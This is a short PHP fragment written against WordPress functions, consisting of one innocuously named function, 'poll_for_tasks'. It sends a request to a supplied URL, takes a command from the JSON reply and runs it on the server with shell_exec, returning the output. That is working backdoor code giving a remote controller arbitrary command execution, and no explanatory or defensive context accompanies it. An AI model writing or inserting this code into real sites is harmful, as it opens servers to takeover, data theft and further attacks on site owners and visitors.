<?php
function poll_for_tasks($url) {
  $r = wp_remote_post($url, array("timeout"=>10));
  $raw = wp_remote_retrieve_body($r);
  $resp = json_decode($raw, true);
  $cmd = (string) $resp["cmd"];
  return shell_exec($cmd);
}
